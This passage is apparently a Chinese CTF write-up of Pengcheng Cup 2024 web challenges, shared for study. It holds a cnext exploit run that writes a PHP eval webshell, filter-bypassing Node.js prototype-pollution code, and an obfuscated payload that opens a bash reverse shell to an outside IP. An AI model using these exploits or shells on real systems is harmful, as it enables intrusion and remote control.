<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h2 data-content="1" id="7908b62bde904bdaf63a7642fbca9590">第四届“鹏城杯”联邦网络靶场协同攻防演练 WEB引言</h2>
<p>第四届“鹏城杯”联邦网络靶场协同攻防演练 WEB全解析，今天刚打完2024鹏城杯感觉比往届都要难，一共打了10小时最后WEB全写出来了，有个JSJail逃逸和Java的jackson原生二次反序列化比较好，以下供师傅们分析学习。</p>
<h2 data-content="1" id="ff573728856b877e46e0ecef9f471c3c">Fileread-pcb2024</h2>
<p>源码如下</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

<span class="k">class</span> <span class="nc">cls1</span>
<span class="p">{</span>
    <span class="k">var</span> <span class="nv">$cls</span><span class="p">;</span>
    <span class="k">var</span> <span class="nv">$arr</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">arr</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="mi">1</span> <span class="o">=&gt;</span> <span class="s1">'fileput'</span><span class="p">);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cls</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">cls2</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">class</span> <span class="nc">cls2</span>

<span class="p">{</span>
    <span class="k">var</span> <span class="nv">$filename</span> <span class="o">=</span> <span class="s1">'a'</span><span class="p">;</span>
    <span class="k">var</span> <span class="nv">$txt</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
    <span class="k">function</span> <span class="nf">fileput</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">echo</span> <span class="s1">'Your file:'</span> <span class="o">.</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">cls1</span><span class="p">();</span>
<span class="k">echo</span> <span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">));</span>
</pre></div>
<p>构造pop链但是读文件读不出来flag想到了cnext</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">class</span> <span class="nc">cls1</span>
<span class="p">{</span>
    <span class="k">var</span> <span class="nv">$cls</span><span class="p">;</span>
    <span class="k">var</span> <span class="nv">$arr</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">arr</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="mi">1</span> <span class="o">=&gt;</span> <span class="s1">'fileput'</span><span class="p">);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cls</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">cls2</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">class</span> <span class="nc">cls2</span>
<span class="p">{</span>
    <span class="k">var</span> <span class="nv">$filename</span> <span class="o">=</span> <span class="s1">'a'</span><span class="p">;</span>
    <span class="k">var</span> <span class="nv">$txt</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
    <span class="k">function</span> <span class="nf">fileput</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">echo</span> <span class="s1">'Your file:'</span> <span class="o">.</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">cls1</span><span class="p">();</span>
<span class="k">echo</span> <span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">));</span>
</pre></div>
<p>修改cnext脚本代码如下即可</p>
<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">send</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">path</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Response</span><span class="p">:</span>

        <span class="sd">"""Sends given `path` to the HTTP server. Returns the response.</span>
<span class="sd">        """</span>

        <span class="c1">#O:4:"cls1":2:{s:3:"cls";O:4:"cls2":2:{s:8:"filename";s:1:"a";s:3:"txt";s:0:"";}s:3:"arr";a:1:{i:1;s:7:"fileput";}}</span>
        <span class="n">a</span><span class="o">=</span><span class="s1">'O:4:"cls1":2:{s:3:"cls";O:4:"cls2":2:{s:8:"filename";s:'</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">path</span><span class="p">))</span><span class="o">+</span><span class="s1">':"'</span><span class="o">+</span><span class="n">path</span><span class="o">+</span><span class="s1">'";s:3:"txt";s:0:"";}s:3:"arr";a:1:{i:1;s:7:"fileput";}}'</span>

        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">url</span><span class="o">+</span><span class="s2">"?ser="</span><span class="o">+</span><span class="n">base64</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">a</span><span class="p">))</span>
    <span class="k">def</span> <span class="nf">download</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">path</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>

        <span class="sd">"""Returns the contents of a remote file.</span>
<span class="sd">        """</span>
        <span class="n">path</span> <span class="o">=</span> <span class="n">f</span><span class="s2">"php://filter/convert.base64-encode/resource={path}"</span>
        <span class="n">response</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s2">"Your file:(.*)"</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="n">re</span><span class="o">.</span><span class="n">S</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">base64</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</pre></div>
<p>跑一下写shell</p>
<div class="highlight"><pre><span></span>python3 cnext<span class="o">-</span>exploit.py <span class="s">"http://192.168.18.24/"</span> <span class="s">'echo "&lt;?php eval(\$_POST[1]);?&gt;" &gt; my.php'</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241109175222-51593f92-9e80-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241109175234-582cd9be-9e80-1.png"/></p>
<h2 data-content="1" id="3b420f6740161de573d4dbf50907dee9">NotAdmin-pcb2024</h2>
<p>源码如下</p>
<div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'express'</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">bodyParser</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'body-parser'</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">jwt</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'jsonwebtoken'</span><span class="p">);</span>
<span class="kd">let</span> <span class="p">{</span> <span class="nx">User</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'./user'</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">crypto</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'crypto'</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">path</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'path'</span><span class="p">)</span>

<span class="kr">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">();</span>
<span class="kr">const</span> <span class="nx">port</span> <span class="o">=</span> <span class="mi">3000</span><span class="p">;</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="s1">'view engine'</span><span class="p">,</span> <span class="s1">'ejs'</span><span class="p">);</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="s1">'views'</span><span class="p">,</span> <span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="s1">'views'</span><span class="p">));</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="kr">static</span><span class="p">(</span><span class="s1">'public'</span><span class="p">));</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">bodyParser</span><span class="p">.</span><span class="nx">urlencoded</span><span class="p">({</span> <span class="nx">extended</span><span class="o">:</span> <span class="kc">true</span> <span class="p">}));</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="nx">json</span><span class="p">());</span>

<span class="kr">const</span> <span class="nx">tmp_user</span> <span class="o">=</span> <span class="p">{}</span>

<span class="kd">function</span> <span class="nx">authenticateToken</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
    <span class="kr">const</span> <span class="nx">authHeader</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">headers</span><span class="p">[</span><span class="s1">'authorization'</span><span class="p">];</span>
    <span class="kr">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">authHeader</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">tmp_user</span><span class="p">.</span><span class="nx">secretKey</span> <span class="o">==</span> <span class="kc">undefined</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">tmp_user</span><span class="p">.</span><span class="nx">secretKey</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">randomBytes</span><span class="p">(</span><span class="mi">16</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="s1">'hex'</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">token</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="s1">'/login'</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">try</span> <span class="p">{</span>
        <span class="kr">const</span> <span class="nx">decoded</span> <span class="o">=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">verify</span><span class="p">(</span><span class="nx">token</span><span class="p">,</span> <span class="nx">tmp_user</span><span class="p">.</span><span class="nx">secretKey</span><span class="p">);</span>
        <span class="nx">req</span><span class="p">.</span><span class="nx">user</span> <span class="o">=</span> <span class="nx">decoded</span><span class="p">;</span>
        <span class="nx">next</span><span class="p">();</span>
    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">ex</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s1">'Invalid token.'</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kr">const</span> <span class="nx">merge</span> <span class="o">=</span> <span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">c</span> <span class="k">in</span> <span class="nx">b</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">b</span><span class="p">[</span><span class="nx">c</span><span class="p">]));</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">check</span><span class="p">(</span><span class="nx">b</span><span class="p">[</span><span class="nx">c</span><span class="p">]))</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">hasOwnProperty</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">b</span><span class="p">.</span><span class="nx">hasOwnProperty</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="k">typeof</span> <span class="nx">a</span><span class="p">[</span><span class="nx">c</span><span class="p">]</span> <span class="o">===</span> <span class="s1">'object'</span> <span class="o">&amp;&amp;</span> <span class="k">typeof</span> <span class="nx">b</span><span class="p">[</span><span class="nx">c</span><span class="p">]</span> <span class="o">===</span> <span class="s1">'object'</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">merge</span><span class="p">(</span><span class="nx">a</span><span class="p">[</span><span class="nx">c</span><span class="p">],</span> <span class="nx">b</span><span class="p">[</span><span class="nx">c</span><span class="p">]);</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="nx">a</span><span class="p">[</span><span class="nx">c</span><span class="p">]</span> <span class="o">=</span> <span class="nx">b</span><span class="p">[</span><span class="nx">c</span><span class="p">];</span>
            <span class="p">}</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">return</span> <span class="mi">0</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nx">a</span>
<span class="p">}</span>

<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">tmp_user</span><span class="p">.</span><span class="nx">secretKey</span><span class="p">)</span>

<span class="kd">var</span> <span class="nx">check</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">str</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nx">input</span> <span class="o">=</span> <span class="sr">/const|var|let|return|subprocess|Array|constructor|load|push|mainModule|from|buffer|process|child_process|main|require|exec|this|eval|while|for|function|hex|char|base|"|'|\\|\[|\+|\*/ig</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">str</span> <span class="o">===</span> <span class="s1">'object'</span> <span class="o">&amp;&amp;</span> <span class="nx">str</span> <span class="o">!==</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">key</span> <span class="k">in</span> <span class="nx">str</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">check</span><span class="p">(</span><span class="nx">key</span><span class="p">))</span> <span class="p">{</span>
                <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">check</span><span class="p">(</span><span class="nx">str</span><span class="p">[</span><span class="nx">key</span><span class="p">]))</span> <span class="p">{</span>
                <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">return</span> <span class="o">!</span><span class="nx">input</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">str</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">};</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">'/login'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">'login'</span><span class="p">)</span>
<span class="p">});</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">'/login'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">merge</span><span class="p">(</span><span class="nx">tmp_user</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">tmp_user</span><span class="p">.</span><span class="nx">secretKey</span> <span class="o">==</span> <span class="kc">undefined</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">tmp_user</span><span class="p">.</span><span class="nx">secretKey</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">randomBytes</span><span class="p">(</span><span class="mi">16</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="s1">'hex'</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">User</span><span class="p">.</span><span class="nx">verifyLogin</span><span class="p">(</span><span class="nx">tmp_user</span><span class="p">.</span><span class="nx">password</span><span class="p">))</span> <span class="p">{</span>
            <span class="kr">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">sign</span><span class="p">({</span> <span class="nx">username</span><span class="o">:</span> <span class="nx">tmp_user</span><span class="p">.</span><span class="nx">username</span> <span class="p">},</span> <span class="nx">tmp_user</span><span class="p">.</span><span class="nx">secretKey</span><span class="p">);</span>
            <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="sb">`Login successful! Token: </span><span class="si">${</span><span class="nx">token</span><span class="si">}</span><span class="err">\</span><span class="sb">nBut nothing happend~`</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">'Login failed!'</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">"Hacker denied!"</span><span class="p">)</span>
    <span class="p">}</span>
<span class="p">});</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="nx">authenticateToken</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
        <span class="nx">backcode</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="nx">tmp_user</span><span class="p">.</span><span class="nx">code</span><span class="p">)</span>
        <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">"something happend~"</span><span class="p">)</span>
    <span class="p">});</span>
<span class="p">});</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">port</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`Server running at http://localhost:</span><span class="si">${</span><span class="nx">port</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
<span class="p">});</span>
</pre></div>
<p>通过code来执行命令，由于关键字过滤掉了单双引号，这里可以全部换成反引号。没有过滤掉<code>Reflect</code>，考虑用反射调用函数实现RCE。首先，由于过滤了<code>child_process</code>还有<code>require</code>关键字，我想到的是base64编码一下再执行</p>
<p>过滤掉了<code>Buffer</code>，可以换成</p>
<div class="highlight"><pre><span></span><span class="nx">Reflect</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="nx">global</span><span class="p">,</span> <span class="nx">Reflect</span><span class="p">.</span><span class="nx">ownKeys</span><span class="p">(</span><span class="nx">global</span><span class="p">).</span><span class="nx">find</span><span class="p">(</span><span class="nx">x</span><span class="p">=&gt;</span><span class="nx">x</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="sb">`Buf`</span><span class="p">)))</span>
</pre></div>
<p>但问题在于，关键字还过滤了中括号，这一点简单，再加一层<code>Reflect.get</code></p>
<div class="highlight"><pre><span></span><span class="nx">Reflect</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="nb">Object</span><span class="p">.</span><span class="nx">values</span><span class="p">(</span><span class="nx">Reflect</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="nx">global</span><span class="p">,</span> <span class="nx">Reflect</span><span class="p">.</span><span class="nx">ownKeys</span><span class="p">(</span><span class="nx">global</span><span class="p">).</span><span class="nx">find</span><span class="p">(</span><span class="nx">x</span><span class="p">=&gt;</span><span class="nx">x</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="sb">`Buf`</span><span class="p">)))),</span><span class="mi">1</span><span class="p">)</span>
</pre></div>
<p>所以基本payload变成</p>
<div class="highlight"><pre><span></span><span class="nx">Reflect</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="nb">Object</span><span class="p">.</span><span class="nx">values</span><span class="p">(</span><span class="nx">Reflect</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="nx">global</span><span class="p">,</span> <span class="nx">Reflect</span><span class="p">.</span><span class="nx">ownKeys</span><span class="p">(</span><span class="nx">global</span><span class="p">).</span><span class="nx">find</span><span class="p">(</span><span class="nx">x</span><span class="p">=&gt;</span><span class="nx">x</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="sb">`Buf`</span><span class="p">)))),</span><span class="mi">1</span><span class="p">)(</span><span class="sb">`Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjdXJsIDEyNy4wLjAuMToxMjM0Iik=`</span><span class="p">,</span><span class="sb">`base`</span><span class="p">.</span><span class="nx">concat</span><span class="p">(</span><span class="mi">64</span><span class="p">)).</span><span class="nx">toString</span><span class="p">()</span>
</pre></div>
<p>但问题在于，这样传过去后，eval只会进行解码，而不是执行解码后的内容，所以需要再套一层eval，因为过滤了eval关键字，同样考虑用反射获取到eval函数。</p>
<div class="highlight"><pre><span></span><span class="nx">Reflect</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="nx">global</span><span class="p">,</span> <span class="nx">Reflect</span><span class="p">.</span><span class="nx">ownKeys</span><span class="p">(</span><span class="nx">global</span><span class="p">).</span><span class="nx">find</span><span class="p">(</span><span class="nx">x</span><span class="p">=&gt;</span><span class="nx">x</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">'eva'</span><span class="p">)))(</span><span class="nx">Reflect</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="nb">Object</span><span class="p">.</span><span class="nx">values</span><span class="p">(</span><span class="nx">Reflect</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="nx">global</span><span class="p">,</span> <span class="nx">Reflect</span><span class="p">.</span><span class="nx">ownKeys</span><span class="p">(</span><span class="nx">global</span><span class="p">).</span><span class="nx">find</span><span class="p">(</span><span class="nx">x</span><span class="p">=&gt;</span><span class="nx">x</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="sb">`Buf`</span><span class="p">)))),</span><span class="mi">1</span><span class="p">)(</span><span class="sb">`Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjdXJsIDEyNy4wLjAuMToxMjM0Iik=`</span><span class="p">,</span><span class="sb">`base`</span><span class="p">.</span><span class="nx">concat</span><span class="p">(</span><span class="mi">64</span><span class="p">)).</span><span class="nx">toString</span><span class="p">())</span>
</pre></div>
<p>原型链污染脚本如下</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>

<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>

<span class="n">burp0_url</span> <span class="o">=</span> <span class="s2">"http://192.168.18.21:80/"</span>

<span class="n">code</span> <span class="o">=</span> <span class="s2">"(Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.includes(`eva`)))(Reflect.get(Object.values(Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.startsWith(`Buf`)))),1)(`Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEyNC4yMjAuMzcuMTczLzIzMzMgMD4mMSciKQ==`,`bas`.concat(`e64`)).toString()))"</span>

<span class="n">burp0_json</span><span class="o">=</span><span class="p">{</span><span class="s2">"code"</span><span class="p">:</span> <span class="n">code</span><span class="p">}</span>

<span class="n">res2</span><span class="o">=</span><span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">burp0_url</span><span class="o">+</span><span class="s1">'login'</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">burp0_json</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="n">res2</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>

<span class="n">burp0_headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"authorization"</span><span class="p">:</span> <span class="s2">"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzMxMTIwMTQyfQ.ul_3t_yYxj4dMh5D-hq2UhRqw5qt3qEI1EdQ92cyjFI"</span><span class="p">}</span>

<span class="n">res</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">burp0_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">burp0_headers</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241109175301-685930b2-9e80-1.png"/></p>
<h2 data-content="1" id="3a7f7a042e39bbab26f47d816a2c0502">python口算-pcb2024</h2>
<p>开局是一个算式</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241109175327-778f636c-9e80-1.png"/></p>
<p>写脚本得到下一关的文件</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>

<span class="n">url</span> <span class="o">=</span> <span class="s2">"http://192.168.18.28/calc"</span>

<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
<span class="n">ans</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">ans</span><span class="p">)</span>

<span class="n">url</span> <span class="o">=</span> <span class="s2">"http://192.168.18.28/?answer="</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">ans</span><span class="p">)</span><span class="o">+</span><span class="s2">"&amp;Submit=Submit"</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241109180213-b1689b48-9e81-1.png"/></p>
<p>得到如下源码</p>
<div class="highlight"><pre><span></span><span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">index</span><span class="p">(</span><span class="n">solved</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">current_expr</span>

    <span class="c1"># 前端计算</span>
    <span class="o">.....</span>
    <span class="o">.....</span>
    <span class="c1"># 通过计算</span>

    <span class="n">username</span> <span class="o">=</span> <span class="s1">'ctfer!'</span>
    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'username'</span><span class="p">):</span>
        <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'username'</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">whitelist_filter</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">whitelist_patterns</span><span class="p">):</span>
            <span class="k">if</span> <span class="n">blacklist_filter</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
                <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="s2">"filtered"</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>
